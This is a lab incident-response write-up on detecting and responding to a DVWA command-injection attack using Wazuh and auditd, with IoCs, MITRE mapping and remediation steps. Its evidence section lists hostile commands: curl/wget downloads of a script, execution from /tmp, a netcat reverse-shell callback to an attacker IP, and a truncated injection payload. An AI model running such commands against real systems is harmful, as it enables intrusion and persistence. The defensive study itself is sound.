# 🚨 Detection and Response to DVWA Command Injection RCE (Wazuh + Auditd)

---

## 📌 Overview

Simulation of a Remote Command Execution (RCE) attack through DVWA Command Injection, resulting in remote shell access, persistence creation, and post-exploitation activity.

- Access: ✔  
- Execution: ✔  
- Persistence: ✔  
- Evasion: ❌  
- Severity: 🔴 9/10 (Critical)  

---

## 📄 Detailed Incident Report

➡️ Full report: [report.md](./report.md)

---

## 🖥️ Environment

- Attacker: `192.168.18.226`  
- Target: `192.168.122.171`  
- SIEM: Wazuh + Auditd  
- Service: Apache2 / DVWA  

---

## 🎯 Attack Scenario

A vulnerable DVWA Command Injection endpoint was exploited to execute arbitrary Linux commands on the target host.

The attacker established a reverse shell connection through Netcat, gaining remote command execution as the `www-data` user. After initial access, persistence artifacts were created in `/tmp`, including simulated cron jobs, SSH authorized_keys persistence, and a fake systemd service.

Post-exploitation activity was monitored through `auditd` process execution logging and host-based investigation techniques.

---

## 🔍 Detection

Detection occurred through Linux `auditd` telemetry integrated with Wazuh monitoring. Suspicious commands such as `curl`, `wget`, `chmod`, and `bash` were captured through EXECVE events.

![Detection](./images/14_auditd_execve_logs.png)

- Rule ID: `exec_monitor`  
- Detection logic: Monitoring suspicious command execution through auditd EXECVE events  

---

## 🧠 Investigation

![Evidence](./images/06_threat_activity.png)

### Evidence:

- Source IP: `192.168.18.226`  
- Endpoint / Service: `/DVWA/vulnerabilities/exec/`  
- Parameter / Vector: `ip=` command injection parameter  
- Reverse shell activity observed  
- Persistence artifacts identified in `/tmp`  
- Outbound network connection to attacker host detected  

---

## 🔎 Indicators of Compromise (IoCs)

| Category | Indicator | Description | MITRE |
|----------|----------|------------|-------|
| Network | `192.168.18.226` | Attacker IP | [T1190](https://attack.mitre.org/techniques/T1190/) |
| Network | `4444` | Reverse shell listener port | [T1071](https://attack.mitre.org/techniques/T1071/) |
| Application | `/DVWA/vulnerabilities/exec/` | Vulnerable endpoint | [T1190](https://attack.mitre.org/techniques/T1190/) |
| Application | `127.0.0.1; bash -c ...` | Command injection payload | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) |
| Behavior | `curl/wget/bash/chmod` | Suspicious execution chain | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) |
| Host | `/tmp/update.sh` | Persistent artifact | [T1053.003](https://attack.mitre.org/techniques/T1053/003/) |
| Host | `/tmp/web-update.service` | Fake systemd persistence | [T1543.002](https://attack.mitre.org/techniques/T1543/002/) |
| Host | `authorized_keys` | SSH persistence artifact | [T1098](https://attack.mitre.org/techniques/T1098/) |
| Detection | `auditd EXECVE` | Process execution telemetry | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) |
| Response | Process investigation | Threat hunting and validation | N/A |

---

## 🔎 Command / Activity Evidence

![Commands](./images/15_suspicious_execve_commands.png)

- `curl http://test.com`
- `wget http://test.com/a.sh`
- `chmod +x /tmp/test.sh`
- `bash /tmp/test.sh`
- `nc -nv 192.168.18.226 4444`
- `systemctl enable web-update.service`

---

## ⚠️ Impact Assessment

- **Access Level:** Remote Command Execution  
- **Privilege Level:** `www-data`  
- **Scope:** Single Linux web server  
- **Exposure:** Web application execution context and local host access  

### Severity: 🔴 9/10 (Critical)

**Justification:**
- Remote code execution confirmed  
- Reverse shell established  
- Persistence mechanisms simulated  
- Post-exploitation activity validated  
- Host-level command execution achieved  

→ The attack demonstrated full remote command execution capabilities against a public-facing web application with persistence simulation and post-exploitation behavior.

---

## 🛡️ Response

### Containment

![Containment](./images/09_authentication_iocs.png)

- Suspicious sessions identified  
- Malicious processes investigated  
- Reverse shell activity validated  
- Persistence artifacts enumerated  

---

### Eradication

- Remove malicious files from `/tmp`
- Remove fake cron persistence
- Remove fake authorized_keys artifact
- Remove fake systemd service
- Disable vulnerable DVWA instance
- Block outbound reverse shell connections

---

### Recovery

![Validation](./images/13_process_tree.png)

- System activity validated after investigation  
- No additional malicious sessions observed  
- Process tree analysis completed  

---

### 🔐 Hardening

- Restrict command execution on web applications  
- Disable dangerous PHP functions  
- Enable stricter auditd monitoring  
- Implement WAF protections  
- Harden Apache/PHP configuration  
- Restrict outbound server communication  
- Improve Linux process monitoring rules  

---

### ✅ Defense Validation

- Suspicious commands detected via auditd  
- Reverse shell behavior investigated  
- Persistence artifacts identified successfully  
- MITRE ATT&CK mapping completed  
- Host telemetry collection validated  

---

## 🧬 MITRE ATT&CK

| Technique ID | Technique Name | Description |
|-------------|--------------|------------|
| [T1190](https://attack.mitre.org/techniques/T1190/) | Exploit Public-Facing Application | Exploitation of DVWA command injection vulnerability |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Unix Shell | Execution of Linux shell commands |
| [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | Download activity using curl/wget |
| [T1053.003](https://attack.mitre.org/techniques/T1053/003/) | Cron | Simulated cron persistence |
| [T1098](https://attack.mitre.org/techniques/T1098/) | Account Manipulation | authorized_keys persistence |
| [T1543.002](https://attack.mitre.org/techniques/T1543/002/) | Systemd Service | Fake malicious service persistence |
| [T1071](https://attack.mitre.org/techniques/T1071/) | Application Layer Protocol | Reverse shell communication |

---

## 🎯 Conclusion

Detection → Investigation → Classification → Response

This lab simulated a realistic Linux web exploitation scenario involving DVWA Command Injection leading to Remote Code Execution (RCE), reverse shell establishment, persistence simulation, and host-based forensic investigation.

The investigation validated malicious process execution, suspicious network activity, persistence artifacts, and post-exploitation behavior using Linux telemetry and auditd monitoring techniques.

---

## 🧠 Skills Developed

- Linux DFIR investigation  
- Web attack analysis  
- Reverse shell investigation  
- Auditd monitoring and telemetry  
- Process tree analysis  
- Threat hunting  
- IOC collection and validation  
- MITRE ATT&CK mapping  
- Linux persistence investigation  
- Incident response workflow  

---

## 📞 Contact

LinkedIn: https://www.linkedin.com/in/tiagokrysiaki/  
GitHub: https://github.com/TKrysiaki
